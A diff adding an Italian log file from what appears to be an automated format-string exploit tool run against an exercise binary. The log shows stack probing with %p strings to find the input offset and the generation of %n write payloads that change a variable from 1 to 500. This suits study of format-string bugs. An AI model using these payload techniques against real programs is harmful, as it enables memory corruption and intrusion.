@@ -1,0 +1,64 @@
+Byte da scrivere: 4
+Dimensione indirizzi: 4 byte
+Endian: little
+
+Input da linea di comando: [{'type': 'command_line_input', 'value': 'PPPP', 'free': True}]
+Input da passare durante l'esecuzione: []
+Preparazione indirizzi e scrittori: 
+   Sottovalori da scrivere: | 500 | 
+   Relative dimensioni di scrittura: [4]
+   Relativi nuovi indirizzi target: | 0xffffcebc | 
+   Scrittori: [['%500x', None, 'n']]
+
+
+Inizio ricerca di input vulnerabili
+
+Input in test: {'type': 'command_line_input', 'value': 'PPPP', 'free': True}
+Input libero, verifica se exploitabile: input exploitabile
+Verifica stampa della dimensione minima della stringa di exploit (10 caratteri): dimensione minima stampata
+Definizione marcati per estrarre fmt nella risposta: pz, nq
+Conteggio della dimensione effettiva dell'input (fino a 514 caratteri): 58 caratteri disponibili + 4 caratteri usati dai marcatori
+Ricerca fmt su stack: 
+   Stringa di ricerca: pzAAAA%1$p%2$p%3$p%4$p%5$p%6$p%7$p%8$p%9$p%10$p%11$p%12$pGGGnq
+   Marcatori non trovati nella risposta per la prima volta, cambio forma stringa di ricerca
+
+   Stringa di ricerca: pzAAAA%1$p%2$p%3$p%4$p%5$pGGGGnqGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
+   Valori esadecimali estratti: ['80484ce', '0', 'c30000', '0', '41417a70']
+    Valore 1 -> 80484ce
+    Valore 2 -> 0
+    Valore 3 -> c30000
+    Valore 4 -> 0
+    Valore 5 -> 41417a70
+
+   Stringa di ricerca: pzAAAA%5$p%6$p%7$p%8$p%9$pGGGGnqGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
+   Valori esadecimali estratti: ['41417a70', '4141', '0', '0', '5710da00']
+    Valore 5 -> 41417a70
+    Valore 6 -> 4141
+
+   Verifica posizione:
+   Stringa di conferma: pzBBBB%5$p%6$p%7$p%8$p%9$pGGGGnqGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
+   Valori esadecimali estratti: ['42427a70', '4242', '0', '0', 'fd296800']
+    Valore 5 -> 42427a70
+    Valore 6 -> 4242
+   Posizione 5
+Generazione fmt per exploit nel formato 'scrittori-indirizzi': 
+   Scrittori: [['%500x', '%08$', 'n']]
+   Padding di allineamento: '..'
+   ATTENZIONE: la dimensione dell'input non è suffichiente a stampare l'fmt di exploit (62 caratteri richiesti), si prosegue comunque con l'exploit essendo disattivato il controllo sulla lunghezza
+   Generazione completata con successo
+La stringa generata è: 
+		b'%500x%08$n..\xbc\xce\xff\xffCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCpznq'
+Inizio exploit: segmentation fault incontrato tentando l'exploit 
+Passaggo alla generazione della stringa nel formato 'indirizzi-scrittori': 
+   Scrittori: [['%496x', '%05$', 'n']]
+   Padding di allineamento: ''
+   ATTENZIONE: la dimensione dell'input non è suffichiente a stampare l'fmt di exploit (62 caratteri richiesti), si prosegue comunque con l'exploit essendo disattivato il controllo sulla lunghezza
+generazione completata con successo
+La stringa generata è: 
+		b'\xbc\xce\xff\xff%496x%05$nCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCpznq'
+Inizio exploit: La risposta è:
+----------------------------------------
+0xffffcebc
+Change i's value from 1 to 500. GOOD
+
+----------------------------------------
